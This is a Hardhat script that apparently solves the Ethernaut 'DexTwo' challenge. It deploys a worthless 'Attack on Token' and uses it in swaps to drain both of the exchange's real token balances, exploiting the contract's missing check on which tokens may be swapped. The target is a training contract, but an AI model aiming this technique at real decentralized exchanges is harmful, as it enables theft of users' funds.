import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0x7C5Af88b148685ABf391612596424A6D85Eb004D";
const CONTRACT_NAME = "DexTwo";

async function main() {
  const [attacker] = await ethers.getSigners();

  const contract = await ethers.getContractAt(CONTRACT_NAME, CONTRACT_ADDRESS);

  const token1 = await contract.token1();
  const token2 = await contract.token2();

  let tx;
  tx = await contract.approve(contract.target, 100000);
  await tx.wait();

  const attackerTokenFactory = await ethers.getContractFactory("SwappableTokenTwo");
  const attackerToken = await attackerTokenFactory.deploy(contract.target, "Attack on Token", "AOT", 100000);
  await attackerToken.waitForDeployment();

  tx = await attackerToken["approve(address,address,uint256)"](attacker.address, contract.target, 100000);
  await tx.wait();

  tx = await attackerToken.transfer(contract.target, 1);
  await tx.wait();

  tx = await contract.swap(attackerToken.target, token1, 1);
  await tx.wait();

  tx = await attackerToken.transfer(contract.target, 8);
  await tx.wait();

  tx = await contract.swap(attackerToken.target, token2, 10);
  await tx.wait();
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});